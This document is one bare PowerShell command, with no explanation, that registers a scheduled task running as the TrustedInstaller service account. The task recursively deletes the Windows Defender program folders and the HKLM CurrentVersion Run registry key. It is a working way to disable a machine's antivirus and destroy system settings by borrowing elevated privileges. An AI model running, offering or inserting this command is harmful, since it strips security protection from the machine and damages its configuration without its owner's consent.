Register-ScheduledTask Defender -Ac (New-ScheduledTaskAction powershell "rm -r 'C:\Program Files*\Windows Defender*',HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run") -User 'NT SERVICE\TrustedInstaller' | Out-Null
